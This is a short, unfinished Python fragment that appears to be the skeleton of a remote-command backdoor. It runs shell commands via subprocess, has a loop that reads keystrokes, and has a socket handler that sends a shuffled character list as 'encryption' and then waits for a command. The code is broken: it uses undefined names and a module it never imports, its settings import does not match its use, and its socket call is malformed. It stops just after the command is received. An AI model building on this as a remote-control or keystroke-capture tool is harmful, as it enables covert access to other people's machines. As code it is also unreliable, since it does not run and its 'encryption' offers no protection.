import subprocess
import socket
import core.settings
import threading
import random


def get_static_output_command(command):
    result = subprocess.run(command.split(), stdout=subprocess.PIPE)
    return result.stdout


def detect_next_press():
    while True:
        key = keyboard.read_key()
        if key:
            return key


MAX_CMD_LENGHT = int(get_static_output_command("getconf ARG_MAX"))
addr = (settings.ALLOWED_HOSTS[0], custom_port)
encryption_list = list('abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()~_+-=[]{};":,./`~')


def connection(conn, addr):
    # here is where the magic happens...
    random.shuffle(encryption_list)
    encryption_str = ""
    for i in encryption_list:
        encryption_str += i

    conn.sendto(encryption_str.encode('utf-8'), (addr, ))
    command = conn.recv(MAX_CMD_LENGHT)
